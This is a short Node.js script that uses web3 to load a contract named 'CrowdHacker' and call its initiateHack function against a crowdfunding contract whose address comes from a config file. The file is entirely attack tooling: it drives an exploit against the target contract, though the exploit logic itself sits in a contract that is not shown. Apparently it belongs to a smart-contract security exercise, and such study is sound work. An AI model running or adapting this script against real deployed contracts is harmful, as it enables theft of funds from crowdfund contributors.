fs = require('fs')
Web3 = require('web3')
web3 = new Web3()
config = require('config')

endpoint = config.get("http_provider")
hackerAddress = config.get("hacker_address")
crowdfundAddress = config.get("contract_address")

web3.setProvider(new web3.providers.HttpProvider(endpoint));

code = fs.readFileSync("contracts/CrowdHacker.bin").toString();
abi = JSON.parse(fs.readFileSync("contracts/CrowdHacker.abi").toString());

var instance = web3.eth.contract(abi).at(hackerAddress);

var result = instance.initiateHack(crowdfundAddress,
    {from: web3.eth.coinbase, gas: 100000},
    function(err, data, something) {
        console.log("err: " + err);
        console.log("data: " + data);
        console.log("something: " + something);
    });
console.log("Result: " + result);

